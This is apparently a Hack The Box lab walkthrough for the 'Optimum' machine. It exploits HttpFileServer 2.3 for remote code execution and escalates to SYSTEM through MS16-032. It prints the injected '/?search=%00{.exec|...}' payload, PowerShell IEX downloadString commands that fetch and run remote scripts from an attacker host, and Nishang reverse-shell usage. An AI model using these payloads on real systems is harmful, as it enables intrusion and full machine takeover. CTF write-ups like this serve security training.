---
title:     "Hack The Box - Optimum"
tags: [windows,easy,sherlock,empire,rce,nishang]
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/1.png)

We are going to pwn Optimum from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/6>


Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Only one port is opened which is ``HTTP``

## HTTP:

From the nmap result itself we know that the webpage is ``HttpFileServer httpd 2.3``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/2.png)

When I click the version, It redirects to it official homepage.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/3.png)

Since we know the version I started searching for exploits available for the version and found this 

>https://www.exploit-db.com/exploits/34668

From the above exploit we can do ``RCE`` on the url.
We can execute it by using ``/?search=%00{.exec|cmd.}`` on the url

Now we need to get a reverse shell from this.

I used [Nishang](https://github.com/samratashok/nishang)

>Nishang is a framework of scripts and payloads that enables using PowerShell for offensive security. By using this we can get the shell.

There is a lot of Shell I choosed ``nishang/Shells/Invoke-PowerShellTcp.ps1`` and copied that to my directory.

If we look at the Shell it gives us some of the examples.
```
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
```

I copied one of the example and changed it to my IP and paste it in bottom of the file.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/4.png)<br/>
This not only load the module but also the shell give me a callback.

We need to start ``python`` server inorder to download it to the box. Started my ``netcat`` listener too.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/5.png)<br/>

Now its time to upload the module to the box

I used Powershell to do that 

```powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/Invoke-PowerShellTcp.ps1')```

I added the location of the ``powershell.exe`` in windows along with the command and we already know for ``RCE``.

```/?search=%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/Invoke-PowerShellTcp.ps1').}```

With URL encoded I passed it to burp.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/6.png)

``Status 200`` means it successfully downloaded to the box.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/7.png)

At the sametime I got the shell in ``nc listener``

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/8.png)

## Privilege Escalation:

Once I got a shell the first thing I check is ``systeminfo``

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/20.png)<br/>
I found some ``Hotfix's``

>A hotfix or quick-fix engineering update is a single, cumulative package that includes information that is used to address a problem in a software product.

So we can use [Sherlock](https://github.com/rasta-mouse/Sherlock) to find the missing patches which will help us to Privilege Escalation.

>Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.



``Sherlock.ps1``

So we need to ``Find AllVulns`` Copy that and paste it in the bottom of the file as we did before.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/9.png)<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/10.png)

Our python server is already ON so we can download it in the box. No need to represent ``powershell(PS)`` because we already in a powershell.

> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/Sherlock.ps1')

Once its executed it displays the output.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/11.png)

Only these are appears to be vulnerable.
```
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Appears Vulnerable
```

So I started from the first one which is ``MS16-032``. The [Powershell Empire](https://github.com/EmpireProject/Empire) have an exploit for this.

Its located in ``/data/module_source/privesc/Invoke-MS16032.ps1`` 

If we look at the script it gives the example of how it need to run.
```
 .EXAMPLE

        C:\PS> Invoke-MS16-032 -Command "iex(New-Object Net.WebClient).DownloadString('http://google.com')"
```

``Invoke-MS16032.ps1``
Copy the example and paste it in the bottom of the file with changes. I copied the same``Invoke-PowerShellTcp.ps1`` which we use to get initial shell as ``root.ps1`` to give us another reverse shell.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/12.png)

Note: ``Invoke-MS16032`` must be as same as in the top of the script.

``root.ps1``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/13.png)

On the box:

>IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31:8000/Invoke-MS16032.ps1')

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/14.png)

We are System!!

# Method II (Using Metasploit):

> https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec

> use exploit/windows/http/rejetto_hfs_exec

Set LHOST and LPORT<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/15.png)

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/16.png)

For privilege escalation, background the session and start ``local_exploit_suggester``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/17.png)

We already know its vulnerable to ``ms16_032``, So I used that exploit
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/18.png)<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-optimum/19.png)

We got authority\system !! 